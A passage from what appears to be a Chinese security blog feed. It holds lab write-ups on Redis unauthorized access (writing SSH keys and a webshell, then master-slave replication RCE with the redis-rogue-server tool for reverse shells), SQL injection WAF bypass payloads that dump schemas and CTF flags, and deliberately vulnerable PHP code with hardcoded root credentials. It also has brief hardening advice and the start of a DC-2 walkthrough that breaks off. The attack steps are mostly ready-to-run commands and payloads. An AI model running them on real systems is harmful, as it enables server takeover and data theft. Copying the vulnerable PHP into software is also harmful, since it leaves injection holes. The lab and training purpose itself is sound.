3.服务器端根据客户端发来的信息查找是否有该客户端的公钥，若没有拒绝登陆；若有则生成一段随机数，使用该公钥加密后发给客户端.<br>​    4.客户端收到服务器发来的加密信息后使用私钥解密，并把解密后的结果发给服务器用于验证.<br>​    5.服务器收到客户端发来的解密结果，与刚刚自己生成的随机数对比，如果一致就允许登陆；不一致则拒绝登陆. </p><p><strong>利用条件</strong></p><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li><li>靶机的root目录下需要有.ssh目录</li></ul><p><strong>复现</strong></p><p>​    先在攻击机生成一对密钥</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment"># 按 y 然后一路回车, 出现下面的内容表示成功</span></span><br><span class="line"><span class="comment"># 查看一下刚刚生成的密钥</span></span><br><span class="line">cd /root/.ssh/</span><br><span class="line">cat id_rsa.pub</span><br><span class="line"><span class="comment"># 复制出来备用</span></span><br><span class="line">----------------------------------------------------</span><br><span class="line">ssh-rsa AAAA0= root@kali</span><br><span class="line">----------------------------------------------------</span><br></pre></td></tr></tbody></table></figure><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200237056.png" alt="image-20220319001338697"><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"><span class="comment"># 设置文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line"><span class="built_in">set</span> ssh <span class="string">"\n\n\ssh-rsa AAAAB3N0= root@kali\n\n\n"</span></span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190025721.png" alt="image-20220319002350648"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190026447.png" alt="image-20220319002534208"></p><hr><h3 id="3-写入webshell"><a href="#3-写入webshell" class="headerlink" title="3. 写入webshell"></a>3. 写入webshell</h3><p><strong>利用条件：</strong>redis权限不高，<strong>服务器开着web服务</strong>，<strong>在redis有web目录写权限时</strong>，可以尝试往web路径（<strong>根据实际情况</strong>）写webshell</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置目录, 不知道目标网站目录的情况下需要爆出路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 写入一句话</span></span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190003611.png" alt="image-20220319000111590"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190003929.png" alt="image-20220319000134087"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190004175.png" alt="image-20220319000346755"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1、禁止外部访问Redis服务端口</p><p>2、禁止使用root权限启动redis服务</p><p>3、配置安全组，限制可连接Redis服务器的IP</p><hr><h3 id="4-主从复制RCE"><a href="#4-主从复制RCE" class="headerlink" title="4. 主从复制RCE"></a>4. 主从复制RCE</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式. </p><p><strong>redis主从复制getshell过程</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>本地编译好外部扩展即so文件</span><br><span class="line"><span class="number">2.</span>把so文件转码存入本地redis数据库</span><br><span class="line"><span class="number">3.</span>到目标服务器上设置主从关系，主服务器指定我们的本地机子</span><br><span class="line"><span class="number">4.</span>待同步后，设置备份路径和备份文件名（xx.so）</span><br><span class="line"><span class="number">5.</span>开始同步，备份数据库</span><br><span class="line"><span class="number">6.</span>然后加载备份数据库</span><br><span class="line"><span class="number">7.</span>然后就可以通过redis执行命令反弹shell了</span><br></pre></td></tr></tbody></table></figure><p>**影响版本:  **<br>        大于4.0.0 &amp; 小于5.0.5</p><p>下载地址:  <a href="http://download.redis.io/releases/redis-4.0.11.tar.gz">http://download.redis.io/releases/redis-4.0.11.tar.gz</a></p><p>攻击机(从): kali - <code>192.168.232.129</code><br>靶机(主): centos 7 - <code>192.168.232.130</code></p><h5 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载redis-4.0.11版本安装包</span></span><br><span class="line">wget http://download.redis.io/releases/redis-<span class="number">4.0</span><span class="number">.11</span>.tar.gz</span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar -xvf redis-<span class="number">4.0</span><span class="number">.11</span>.tar.gz</span><br><span class="line"><span class="comment"># 重命名并编译安装</span></span><br><span class="line">mv redis-<span class="number">4.0</span><span class="number">.11</span>.tar.gz redis</span><br><span class="line">cd redis</span><br><span class="line">make</span><br><span class="line"><span class="comment"># 编辑配置文件, vim redis.conf</span></span><br><span class="line">bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> &gt;&gt; <span class="comment"># bind 127.0.0.1 注释掉, 表示除本地以外所有ip都可以连接. </span></span><br><span class="line">protected-mode yes &gt;&gt; protected-mode no 表示关闭保护模式</span><br><span class="line"><span class="comment"># vim 按ESC进入底线模式 wq 保存退出</span></span><br><span class="line"><span class="comment"># 将配置文件复制到 etc 目录下</span></span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"><span class="comment"># 进入 src 目录, 将配置文件复制到 /usr/bin/目录下</span></span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/<span class="built_in">bin</span>/</span><br><span class="line">cp redis-cli /usr/<span class="built_in">bin</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238820.png" alt="image-20220319235203018"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238810.png" alt="image-20220319235308818"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238894.png" alt="image-20220319235128065"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238407.png" alt="image-20220319235601573"></p><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接靶机服务器</span></span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.232</span><span class="number">.130</span></span><br><span class="line"><span class="comment"># 设置从攻击机为从服务器, 然后 exit 退出</span></span><br><span class="line">slaveof <span class="number">192.168</span><span class="number">.232</span><span class="number">.129</span> <span class="number">6379</span></span><br><span class="line"><span class="comment"># 连接攻击机服务器</span></span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.232</span><span class="number">.129</span></span><br><span class="line"><span class="comment"># 设置测试的键值, 然后 exit 退出</span></span><br><span class="line"><span class="built_in">set</span> e <span class="number">5</span></span><br><span class="line"><span class="comment"># 连接靶机服务器</span></span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.232</span><span class="number">.130</span></span><br><span class="line"><span class="comment"># 查看攻击机服务器上设置的键值是否同步到靶机的主服务器上</span></span><br><span class="line">get e</span><br><span class="line"><span class="comment"># 测试成功</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238577.png" alt="image-20220320003744291"></p><h5 id="攻击直接用-exp"><a href="#攻击直接用-exp" class="headerlink" title="攻击直接用 exp"></a>攻击直接用 exp</h5><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载exp</span></span><br><span class="line">git clone https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line"><span class="comment"># 进入 exp 脚本目录并编译 exp 生成 .so 文件</span></span><br><span class="line">cd redis-rogue-server/RedisModulesSDK/exp/</span><br><span class="line"><span class="comment"># 将生成的 .so 文件 复制到 redis-rogue-server 目录下</span></span><br><span class="line">cp exp.so /root/redis-rogue-server</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238960.png" alt="image-20220320013335170"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238146.png" alt="image-20220320013505693"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238518.png" alt="image-20220320013616610"></p><h5 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./redis-rogue-server.py -rhost 靶机(主)IP --lhost 攻击机(从)IP</span><br><span class="line">i: 交互式shell</span><br><span class="line">r: 反向交互式shell</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238625.png" alt="image-20220320012620558"></p><h5 id="反向交互式shell"><a href="#反向交互式shell" class="headerlink" title="反向交互式shell"></a>反向交互式shell</h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203200238258.png" alt="image-20220320014414465"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计过waf 黑盒测试过waf 加固代码，防注入</title>
      <link href="/2022/03/03/%E7%99%BD%E7%9B%92%E9%BB%91%E7%9B%92%E7%BB%95%E8%BF%87waf%E5%92%8C%E5%8A%A0%E5%9B%BA%E4%BB%A3%E7%A0%81/"/>
      <url>/2022/03/03/%E7%99%BD%E7%9B%92%E9%BB%91%E7%9B%92%E7%BB%95%E8%BF%87waf%E5%92%8C%E5%8A%A0%E5%9B%BA%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h3 id="一-代码审计过waf"><a href="#一-代码审计过waf" class="headerlink" title="一. 代码审计过waf"></a>一. 代码审计过waf</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// 关闭错误报告</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'id'</span>]))</span><br><span class="line">        {   <span class="comment">// 在每个单引号前面添加 \ 反斜杠</span></span><br><span class="line">        <span class="variable">$tmp</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'id'</span>]);</span><br><span class="line">            <span class="comment">// 解码已经编码的 URL 字符串</span></span><br><span class="line">        <span class="variable">$tmp</span> = urldecode(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="comment">// 正则表达式 /i 表示大小写不敏感</span></span><br><span class="line">        <span class="variable">$keyword</span> = <span class="string">"/(union select)|(order by)|(-- )|floor\(\)|updatexml\(\)|extractvalue\(\)|\/\*\*\/|(and 1=)/i"</span>;</span><br><span class="line">            <span class="comment">// 匹配正则表达式, 参数$keyword为搜索模式, $tmp输入的字串. </span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$keyword</span>,<span class="variable">$tmp</span>))</span><br><span class="line">        {</span><br><span class="line">            show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="variable">$id</span> = <span class="variable">$tmp</span>;</span><br><span class="line">            <span class="variable">$conn</span> = @mysql_connect(<span class="string">'localhost'</span>, <span class="string">'test1'</span>, <span class="string">'test1'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">            mysql_query(<span class="string">'set names utf8'</span>);</span><br><span class="line">            @mysql_select_db(<span class="string">'test1'</span>, <span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">            <span class="variable">$select_sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' limit 0,1"</span>;</span><br><span class="line">            <span class="variable">$select_sql_result</span>=mysql_query(<span class="variable">$select_sql</span>,<span class="variable">$conn</span>);</span><br><span class="line">            <span class="variable">$data</span>=mysql_fetch_row(<span class="variable">$select_sql_result</span>);</span><br><span class="line">            mysql_free_result(<span class="variable">$select_sql_result</span>);</span><br><span class="line">            mysql_close(<span class="variable">$conn</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;&lt;br/&gt;&lt;p&gt;"</span>;</span><br><span class="line">            print_r(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;br/&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    }</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>当 <code>POST</code> 的数据是 <code>id=1%2527</code> 时，数据发送到服务端会解码一次变为 <code>id=1%27</code> ，由于没有敏感字符，经过 <code>addslashes()</code> 函数过滤后，还是 <code>id=1%27</code>，此时再经过 <code>urldecode()</code> 解码函数，数据为 <code>id=1'</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 测试注入</span><br><span class="line">id=1'"\--+</span><br><span class="line">id=1'"--+</span><br><span class="line">id=1'--+</span><br><span class="line">id=1'"\#</span><br><span class="line">id=1'"#</span><br><span class="line">id=1'#</span><br><span class="line">id=1%2527 #</span><br><span class="line">id=0%2527 #</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010040037.png" alt="image-20220228220616726"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 判断字段数和回显点</span><br><span class="line">id=1' order by 3#</span><br><span class="line">id=1' order  3#</span><br><span class="line">id=0%2527 ororder by 3 #</span><br><span class="line">id=0%2527 /*!40001order*/by 4 #</span><br><span class="line">id=0%2527 /*!40001order*/by 3 #</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,6#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041823.png" alt="image-20220228220709032"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041101.png" alt="image-20220228225850818"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041682.png" alt="image-20220228232004679"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 表</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041588.png" alt="image-20220228230646068"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 字段</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(column_name) from information_schema.columns where table_name="flag"#</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(column_name) from information_schema.columns where table_name='flag'#</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(column_name) from information_schema.columns where table_name=%2527flag%2527#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041964.png" alt="image-20220228230952683"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 内容</span><br><span class="line">id=0%2527 /*!40001union*/select 4,5,group_concat(flag) from flag#</span><br><span class="line"></span><br><span class="line">flag{1qaz1q-2wsx2w-1qdf3e-2wsd3e}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041518.png" alt="image-20220228231157551"></p><hr><h3 id="二-黑盒测试过waf"><a href="#二-黑盒测试过waf" class="headerlink" title="二. 黑盒测试过waf"></a>二. 黑盒测试过waf</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">id=1# 正常</span><br><span class="line">id=1'# 报错,有注入</span><br><span class="line">id=1'## 正常</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041866.png" alt="image-20220301002529192"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 判断字段数和回显点</span><br><span class="line">id=1' order by 1 #</span><br><span class="line">id=1' oorrder by 1 #</span><br><span class="line">id=-1' ununionion seselectlect 4,5,6,7#</span><br><span class="line">id=-1' ununionion seselectlect 4,5,6#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041494.png" alt="image-20220228235041485"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 库</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(schema_name) from infoorrmation_schema.schemata#</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(schema_name) frfromom infoorrmation_schema.schemata#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041771.png" alt="image-20220228235555837"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 表</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema=database()#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041838.png" alt="image-20220228235807136"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 字段</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(column_name) frfromom infoorrmation_schema.columns where table_name='flag'#</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041600.png" alt="image-20220228235916240"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># flag</span><br><span class="line">id=-1' ununionion seselectlect 4,5,group_concat(flag) frfromom flag#</span><br><span class="line"></span><br><span class="line">flag{3edfr4-fhu78e-8uj2we-0oj3r5}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203010041363.png" alt="image-20220301000028132"></p><hr><h3 id="三-加固代码，防注入"><a href="#三-加固代码，防注入" class="headerlink" title="三. 加固代码，防注入"></a>三. 加固代码，防注入</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码中 <code>mysql_query('set names "gbk"')</code> 表示数据库是GBK编码, 没有任何过滤, 存在宽字节注入</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$id</span> = @<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">"localhost:3306"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">mysql_query(<span class="string">'set names "gbk"'</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where id="</span>.<span class="variable">$id</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>){</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$arra</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC)){</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r(<span class="variable">$arra</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">mysql_free_result(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//close connection</span></span><br><span class="line">mysql_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>防止宽字节注入</strong></p><p>使用 mysql_set_charset(“GBK”)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql_query('set names "gbk"');中的 set names "gbk"</span><br><span class="line">相当于下面的三句命令: </span><br><span class="line">set character_set_client = gbk;# 设置客户端发送至服务端的内容进行gbk编码</span><br><span class="line">set character_set_results = gbk;# 设置将结果返回客户端时指定gbk编码发送</span><br><span class="line">set character_set_connection = gbk;# 数据库收到客户端的语句后，要转换至 gbk 的编码</span><br><span class="line"># 如果 character_set_client 和 character_set_connection 一样，或者当前的字符编码是和ASCII兼容，并且都是ASCII范围内的，就不转换，其它情况就转.</span><br><span class="line"># 从php 5.2.3以及mysql 5.0.7之后set names 语句将不再使用，而尽量要使用mysql_set_charset()函数.</span><br></pre></td></tr></tbody></table></figure><p>使用 mysql_real_escape_string($id)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  将字符串中符号进行转义</span><br><span class="line">1. \x00</span><br><span class="line">2. \x1a</span><br><span class="line">3. \n</span><br><span class="line">4. \r</span><br><span class="line">5. \</span><br><span class="line">6. '</span><br><span class="line">7. "</span><br><span class="line"># 比如使用的单引号被从 ' 转义为了 \'，所以注入语句无法执行</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210955230.png" alt="image-20220228223100114"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机_DC-2</title>
      <link href="/2022/03/02/Vulnhub%E9%9D%B6%E6%9C%BA_DC-2/"/>
      <url>/2022/03/02/Vulnhub%E9%9D%B6%E6%9C%BA_DC-2/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>与DC-1非常相似，DC-2是另一个特意建立的脆弱实验室，目的是在渗透测试的世界中获得经验.  与最初的DC-1一样，它是为初学者设计的. </p><p>Linux技能和对Linux命令行的熟悉是必须的，对基本的渗透测试工具也有一些经验. 就像DC-1一样，有五个标志，包括最后的标志. </p><p><strong>下载地址</strong>: <a href="http://www.five86.com/downloads/DC-2.zip">http://www.five86.com/downloads/DC-2.zip</a></p><h3 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h3><p>使用arp-scan工具</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936854.png" alt="image-20220307192107979"></p><h3 id="2-扫描目标端口"><a href="#2-扫描目标端口" class="headerlink" title="2. 扫描目标端口"></a>2. 扫描目标端口</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 